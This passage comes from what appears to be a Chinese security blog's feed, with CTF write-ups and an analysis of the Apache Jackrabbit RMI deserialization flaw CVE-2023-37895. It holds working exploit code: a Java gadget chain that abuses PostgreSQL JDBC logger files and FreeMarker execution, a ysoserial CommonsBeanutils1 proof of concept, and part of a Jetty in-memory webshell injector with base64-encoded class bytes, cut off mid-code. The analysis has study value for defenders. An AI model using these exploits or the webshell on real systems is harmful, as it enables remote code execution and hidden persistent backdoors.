dcr=fc.getDefaultConfiguration().getNewBuiltinClassResolver()&gt;\n&quot;</span>+<span class="string">&quot;&lt;#assign VOID=fc.setNewBuiltinClassResolver(dcr)&gt;/$&#123;\&quot;freemarker.template.utility.Execute\&quot;?new()(\&quot;cat /flag\&quot;)&#125;&quot;</span>;</span><br><span class="line">            System.out.println(shellContent);</span><br><span class="line">            <span class="type">String</span> <span class="variable">jdbcUrl</span> <span class="operator">=</span> <span class="string">&quot;jdbc:postgresql://&quot;</span>+<span class="string">&quot;47.108.206.43:39201&quot;</span>+<span class="string">&quot;/aaaa?ApplicationName=&quot;</span>+<span class="string">&quot;123123123&quot;</span>+<span class="string">&quot;&amp;loggerFile=&quot;</span>+loggerFile+<span class="string">&quot;&amp;loggerLevel=&quot;</span>+loggerLevel;</span><br><span class="line">            pgConnectionPoolDataSource.setURL(jdbcUrl);</span><br><span class="line">            pgConnectionPoolDataSource.setServerNames(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;shellContent&#125;);</span><br><span class="line">            <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">            SerializeUtils.setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;connection&quot;</span>);</span><br><span class="line">            <span class="type">TreeBag</span> <span class="variable">treeBag</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeBag</span>(comparator);</span><br><span class="line">            TreeMap&lt;Object,Object&gt; m = <span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;&gt;();</span><br><span class="line">            SerializeUtils.setFieldValue(m, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">            SerializeUtils.setFieldValue(m, <span class="string">&quot;modCount&quot;</span>, <span class="number">2</span>);</span><br><span class="line">            Class&lt;?&gt; nodeC = Class.forName(<span class="string">&quot;java.util.TreeMap$Entry&quot;</span>);</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">nodeCons</span> <span class="operator">=</span> nodeC.getDeclaredConstructor(Object.class, Object.class, nodeC);</span><br><span class="line">            nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="type">Object</span> <span class="variable">MutableInteger</span> <span class="operator">=</span> SerializeUtils.createWithoutConstructor(<span class="string">&quot;org.apache.commons.collections.bag.AbstractMapBag$MutableInteger&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> nodeCons.newInstance(pgConnectionPoolDataSource,MutableInteger, <span class="literal">null</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">right</span> <span class="operator">=</span> nodeCons.newInstance(pgConnectionPoolDataSource, MutableInteger, node);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            SerializeUtils.setFieldValue(node, <span class="string">&quot;right&quot;</span>, right);</span><br><span class="line">            SerializeUtils.setFieldValue(m, <span class="string">&quot;root&quot;</span>, node);</span><br><span class="line">            SerializeUtils.setFieldValue(m, <span class="string">&quot;comparator&quot;</span>, comparator);</span><br><span class="line">            SerializeUtils.setFieldValue(treeBag,<span class="string">&quot;map&quot;</span>,m);</span><br><span class="line">            System.out.println(SerializeUtils.base64serial(treeBag));</span><br><span class="line">            SerializeUtils.deserTester(treeBag);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里话解释上述代码中几个段的问题</p><p><img src="../images/image-20231228171546089.png" alt="image-20231228171546089"></p><p>这里话就是实例化TreeMap类中的内部类Entry类  这个类的话是因为内部类  所以需要反射来进行实例化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object MutableInteger = SerializeUtils.createWithoutConstructor(&quot;org.apache.commons.collections.bag.AbstractMapBag$MutableInteger&quot;);</span><br></pre></td></tr></table></figure><p>这一步是对内部类的反射实例化  (只不过因为这个是protected  所以用这个createWithoutConstructor方法来实例化)</p><p><img src="../images/image-20231228172001962.png" alt="image-20231228172001962"></p><p><img src="../images/image-20231228172910035.png" alt="image-20231228172910035"></p><p>这两行的话就是给上面刚刚实例化的Entry内部类的构造函数进行赋值</p><p><img src="../images/image-20231228172957366.png" alt="image-20231228172957366"></p><p><img src="../images/image-20231228174300711.png" alt="image-20231228174300711"></p><h2 id="ai-java"><a href="#ai-java" class="headerlink" title="ai_java"></a>ai_java</h2><p>这个题就是SerializedData + LDAP攻击  然后打fastjson </p><p><a href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JNDI/#serializeddata--ldap%E6%94%BB%E5%87%BB">https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JNDI/#serializeddata--ldap%E6%94%BB%E5%87%BB</a></p><p>这篇文章写的不错</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;复现一下安洵的题目 这里就挑几道来复现就行了  复现地址的话在安洵平台上就可以&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://dce.i-soon.net/#/topicBank&quot;&gt;https://dce.i-soon.net/#/topicBank&lt;/a&gt;&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://ke1nys.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>针对环境只有DNS出网的反弹shell和隧道搭建</title>
    <link href="https://ke1nys.github.io/posts/e8e277ba.html"/>
    <id>https://ke1nys.github.io/posts/e8e277ba.html</id>
    <published>2023-12-14T09:13:03.000Z</published>
    <updated>2024-01-20T15:32:19.409Z</updated>
    
    <content type="html"><![CDATA[<p>而且这个主机的是采用站库分离的形式  数据库和网站分别在内网两个ip段下</p><p>这个只有DNS出网的环境是第一次见<strong>(一般来说内网主机都是啥也不出的)</strong>  所以来记录学习一下  但是我在第一步就卡住了  tmd 我切换成root用户的时候报了个奇奇怪怪的错误</p><p><img src="../images/image-20231214171449326.png" alt="image-20231214171449326"></p><p>所以放弃了  不做了  写个文章来记录一下就行了 </p><p><strong>这里除了学到这个DNS的反弹shell和隧道搭建   还有可以将我们的数据来进行分段传输上去</strong></p><p>我们在使用dnscat来反弹shell之后  我们就是用iodine工具来搭建隧道   <strong>(这里不直接使用这个dns隧道的原因就是这个东西不能搭配socks协议使用)</strong>  使其我们能直接ssh登录该内网服务器</p><p><strong>(因为只有DNS出网  并且我们能够ssh登录成功  那么我们就使用ssh来搭建隧道  使其能访问到内网其他主机)</strong></p><p>贴个大头师傅的博客地址  <a href="https://www.xiinnn.com/posts/icq-tunnelx/">https://www.xiinnn.com/posts/icq-tunnelx/</a></p><p>然后这就是全部了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;而且这个主机的是采用站库分离的形式  数据库和网站分别在内网两个ip段下&lt;/p&gt;
&lt;p&gt;这个只有DNS出网的环境是第一次见&lt;strong&gt;(一般来说内网主机都是啥也不出的)&lt;/strong&gt;  所以来记录学习一下  但是我在第一步就卡住了  tmd 我切换成root用户的时</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>Java-Apache_Jackrabbit_RMI-CVE-2023-37895</title>
    <link href="https://ke1nys.github.io/posts/41fade43.html"/>
    <id>https://ke1nys.github.io/posts/41fade43.html</id>
    <published>2023-12-13T07:27:35.000Z</published>
    <updated>2024-01-20T15:32:19.402Z</updated>
    
    <content type="html"><![CDATA[<p>参考链接</p><p><a href="https://xz.aliyun.com/t/13118">https://xz.aliyun.com/t/13118</a></p><p><a href="https://boogipop.com/2023/10/16/Apache%20Jackrabbit%20RMI%20RCE%20%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/">https://boogipop.com/2023/10/16/Apache%20Jackrabbit%20RMI%20RCE%20%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/</a></p><h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><p><a href="https://jackrabbit.apache.org/jcr/downloads.html#apache-jackrabbit-2-20-10-november-7th-2023">https://jackrabbit.apache.org/jcr/downloads.html#apache-jackrabbit-2-20-10-november-7th-2023</a>   </p><p>把2.20.10版本的jar包下载下来  然后去github上下载其相同版本的源码</p><p><img src="../images/image-20231213153027425.png" alt="image-20231213153027425"></p><p>配置好Debug   然后运行jar包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp; &#x27;C:\Program Files\Java\jdk1.8.0_202\bin\java.exe&#x27; -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005 -jar .\jackrabbit-standalone-2.20.10.jar</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231213153113363.png" alt="image-20231213153113363"></p><p>部署成功 </p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在Apache Jackrabbit webapp和standalone中使用了commons-beanutils组件，该组件包含一个可用于通过 RMI 远程执行代码的类。攻击者可利用该组件构造恶意的序列化对象，发送到服务端的RMI服务端口或者Web服务的/rmi路径，目标服务器对恶意对象反序列化导致RCE</p><p>POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.jackrabbit.rmi.repository.URLRemoteRepository;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.ObjectPayload;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.jcr.SimpleCredentials;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">poc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class&lt;? <span class="keyword">extends</span> <span class="title class_">ObjectPayload</span>&gt; payloadClass = ObjectPayload.Utils.getPayloadClass(<span class="string">&quot;CommonsBeanutils1&quot;</span>);</span><br><span class="line">        <span class="type">ObjectPayload</span> <span class="variable">payload</span> <span class="operator">=</span> (ObjectPayload)payloadClass.newInstance();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> payload.getObject(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">SimpleCredentials</span> <span class="variable">simpleCredentials</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleCredentials</span>(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;admin&quot;</span>.toCharArray());</span><br><span class="line">        simpleCredentials.setAttribute(<span class="string">&quot;admin&quot;</span>, object);</span><br><span class="line"></span><br><span class="line">        <span class="type">URLRemoteRepository</span> <span class="variable">repository</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLRemoteRepository</span>(<span class="string">&quot;http://localhost:8080/rmi&quot;</span>);</span><br><span class="line">        repository.login(simpleCredentials);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>漏洞点存在于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;RMI&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;org.apache.jackrabbit.servlet.remote.RemoteBindingServlet&lt;/servlet-class&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;RMI&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/rmi&lt;/url-pattern&gt;</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br></pre></td></tr></table></figure><p>就是在这个/rmi路由下   对应的类是<code>RemoteBindingServlet</code></p><p><img src="../images/image-20231213153552850.png" alt="image-20231213153552850"></p><p>这段代码的作用是将远程存储库对象进行序列化，并将序列化后的对象以二进制流的形式作为响应发送给客户端.</p><p><img src="../images/image-20231213154117134.png" alt="image-20231213154117134"></p><p>然后跟进这个login方法</p><p><img src="../images/image-20231213154203284.png" alt="image-20231213154203284"></p><p>为什么是这个AbstractRepository类的原因是   因为这个类是URLRemoteRepository的父类</p><p><img src="../images/image-20231213154236841.png" alt="image-20231213154236841"></p><p><img src="../images/image-20231213154304610.png" alt="image-20231213154304610"></p><p><img src="../images/image-20231213154340914.png" alt="image-20231213154340914"></p><p>然后进入这个重载login方法   这里获取到的factory是 URLRemoteRepositoryFactory  这个工厂类  然后我们在跟进这个工厂类的login方法</p><p><img src="../images/image-20231213154729422.png" alt="image-20231213154729422"></p><p>这段代码是一个 login() 方法的实现，用于通过提供的凭据和工作空间登录到远程存储库，并返回一个会话（Session）对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 调用 remote 对象的 login() 方法来进行远程登录。</span><br><span class="line">// remote 是一个远程存储库对象（RemoteRepository），通过调用其 login() 方法，使用提供的凭据和工作空间进行登录操作。</span><br><span class="line">// 返回值是一个远程会话对象（RemoteSession）</span><br></pre></td></tr></table></figure><p>那么我们就接着来看服务端这边处理远程登录的代码</p><p>ServerRepository的login方法</p><p><img src="../images/image-20231213155139423.png" alt="image-20231213155139423"></p><p><img src="../images/image-20231213155214492.png" alt="image-20231213155214492"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">// 调用 repository 对象的 login() 方法来进行登录操作</span><br></pre></td></tr></table></figure><p>这里的关键点是credentials是通过客户端传递过来的，而Credentials接口继承了Serializable接口</p><p><img src="../images/image-20231213155501100.png" alt="image-20231213155501100"></p><p><img src="../images/image-20231213155540985.png" alt="image-20231213155540985"></p><p>并且SimpleCredentials这个类使用了这个接口  并且里面刚好有public的setter和getter方法能赋值这个hashmap的attributes参数</p><p><img src="../images/image-20231213155652543.png" alt="image-20231213155652543"></p><p>这里的value设置成恶意的对象，能够在反序列化的过程中触发RCE，具体设置成什么，则需要在Apache Jackrabbit寻找其他可利用的链 <strong>(然后我们在查看依赖的过程发现  其中存在这个cb这个依赖)</strong></p><p><img src="../images/image-20231213155803256.png" alt="image-20231213155803256"></p><p>那么我们就可以来设置value为cb链了</p><p>接下来的过程就是调用远程ServerRepository的login方法，其参数是构造的恶意SimpleCredentials，其过程是服务端开启了一个RMI服务，客户端调用该服务并发送恶意对象，服务端反序列化恶意对象，触发RCE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unmarshalvalue方法，在rmi请求的流程中，客户端会序列化请求的参数，然后在服务端的unmarshalvalue方法进行readobject反序列化，从而导致RCE</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231213160242219.png" alt="image-20231213160242219"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect) [3]</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">invokeMethod:2128, PropertyUtilsBean (org.apache.commons.beanutils)</span><br><span class="line">getSimpleProperty:1279, PropertyUtilsBean (org.apache.commons.beanutils)</span><br><span class="line">getNestedProperty:809, PropertyUtilsBean (org.apache.commons.beanutils)</span><br><span class="line">getProperty:885, PropertyUtilsBean (org.apache.commons.beanutils)</span><br><span class="line">getProperty:464, PropertyUtils (org.apache.commons.beanutils)</span><br><span class="line">compare:163, BeanComparator (org.apache.commons.beanutils)</span><br><span class="line">siftDownUsingComparator:722, PriorityQueue (java.util)</span><br><span class="line">siftDown:688, PriorityQueue (java.util)</span><br><span class="line">heapify:737, PriorityQueue (java.util)</span><br><span class="line">readObject:797, PriorityQueue (java.util)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect) [2]</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:1170, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:2178, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:2069, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1573, ObjectInputStream (java.io)</span><br><span class="line">readObject:431, ObjectInputStream (java.io)</span><br><span class="line">readObject:1412, HashMap (java.util)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect) [1]</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:1170, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:2178, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:2069, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1573, ObjectInputStream (java.io)</span><br><span class="line">defaultReadFields:2287, ObjectInputStream (java.io)</span><br><span class="line">readSerialData:2211, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:2069, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1573, ObjectInputStream (java.io)</span><br><span class="line">readObject:431, ObjectInputStream (java.io)</span><br><span class="line">unmarshalValue:322, UnicastRef (sun.rmi.server)</span><br><span class="line">unmarshalParametersUnchecked:628, UnicastServerRef (sun.rmi.server)</span><br><span class="line">unmarshalParameters:616, UnicastServerRef (sun.rmi.server)</span><br><span class="line">dispatch:338, UnicastServerRef (sun.rmi.server)</span><br><span class="line">run:200, Transport$1 (sun.rmi.transport)</span><br><span class="line">run:197, Transport$1 (sun.rmi.transport)</span><br><span class="line">doPrivileged:-1, AccessController (java.security)</span><br><span class="line">serviceCall:196, Transport (sun.rmi.transport)</span><br><span class="line">handleMessages:573, TCPTransport (sun.rmi.transport.tcp)</span><br><span class="line">run0:834, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)</span><br><span class="line">lambda$run$0:688, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)</span><br><span class="line">run:-1, 1943300791 (sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$14)</span><br><span class="line">doPrivileged:-1, AccessController (java.security)</span><br><span class="line">run:687, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)</span><br><span class="line">runWorker:1149, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:624, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:748, Thread (java.lang)</span><br></pre></td></tr></table></figure><p>这个就是完整的调用栈了</p><h2 id="内存马注入"><a href="#内存马注入" class="headerlink" title="内存马注入"></a>内存马注入</h2><p>这里直接就是参考boogipop师傅的</p><p><img src="../images/image-20231213172041855.png" alt="image-20231213172041855"></p><p>jetty9版本  那么直接去找jetty9的poc来打就行了</p><p>内存马打法其实都一样</p><p>InjectJettyServletShell.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> sun.misc.BASE64Decoder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InjectJettyServletShell</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Object</span> <span class="variable">servletHandler</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> <span class="string">&quot;ServletTemplates&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">filterClassName</span> <span class="operator">=</span> <span class="string">&quot;org.example.ServletTemplates&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;/*&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">LoadServlet</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Thread.currentThread().getContextClassLoader().loadClass(filterClassName).newInstance();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            <span class="type">Method</span> <span class="variable">a</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, Integer.TYPE, Integer.TYPE);</span><br><span class="line">            a.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">byte</span>[] b = (<span class="keyword">new</span> <span class="title class_">BASE64Decoder</span>()).decodeBuffer(<span class="string">&quot;yv66vgAAADQBHgoARwB+CgAQAH8KAIAAgQoAWACCCQCDAIQIAIUKAIYAhwgAiAsAiQCKCACLCgAQAIwIAI0KABAAjgkAjwCQCACRBwCSCACTCACUCABhCACVBwCWCgCXAJgKAJcAmQoAmgCbCgAVAJwIAJ0KABUAngoAFQCfCwCgAKEKAKIAhwgAowsAiQCkCwCJAKUIAKYLAIkApwgAqAsAqQCqCACrCgCsAK0HAK4HAK8KACkAfgsAqQCwCgApALEIALIKACkAswoAKQC0CgAoALUKAKwAtgsAiQC3CgC4ALkKAEYAugoArAC7BwC8CgBBAL0KAD0AvgoANgC/CgA2AMAKAD0AwQgAwgcAwwcAxAcAxQoAPQDGBwDHCgDIAMkHAMoKAEMAywoARgDMBwDNBwDOAQABVQEADElubmVyQ2xhc3NlcwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAeTG9yZy9leGFtcGxlL1NlcnZsZXRUZW1wbGF0ZXM7AQANQkFTRTY0RGVjb2RlcgEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBAARkYXRhAQASTGphdmEvbGFuZy9TdHJpbmc7AQAKaW5wdXRCeXRlcwEAAltCAQAHZW5jb2RlcgcAzwEAB0RlY29kZXIBABpMamF2YS91dGlsL0Jhc2U2NCREZWNvZGVyOwEADGVuY29kZWRCeXRlcwEABmRvUG9zdAEAUihMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7KVYBAARjbWRzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEABnJlc3VsdAEAA2NtZAEAAWsBAAZjaXBoZXIBABVMamF2YXgvY3J5cHRvL0NpcGhlcjsBAA5ldmlsQ2xhc3NCeXRlcwEACWV2aWxDbGFzcwEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAKZXZpbE9iamVjdAEAEkxqYXZhL2xhbmcvT2JqZWN0OwEADHRhcmdldE1ldGhvZAEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAA1TdGFja01hcFRhYmxlBwCSBwBfBwDKAQAKRXhjZXB0aW9ucwcA0AEABWRvR2V0AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQAKU291cmNlRmlsZQEAFVNlcnZsZXRUZW1wbGF0ZXMuamF2YQwASgBLDADRANIH